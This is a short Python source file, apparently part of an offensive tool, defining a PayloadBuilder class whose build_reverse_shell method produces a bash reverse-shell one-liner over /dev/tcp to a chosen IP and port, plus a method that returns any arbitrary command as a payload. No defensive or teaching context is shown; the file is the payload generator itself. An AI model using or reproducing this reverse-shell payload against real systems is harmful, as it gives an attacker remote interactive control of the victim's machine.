# core/payload_builder.py

class PayloadBuilder:
    def __init__(self):
        self.template = ""

    def build_reverse_shell(self, ip, port):
        self.template = f"""
        bash -i >& /dev/tcp/{ip}/{port} 0>&1
        """
        return self.template

    def build_custom(self, command):
        self.template = command
        return self.template
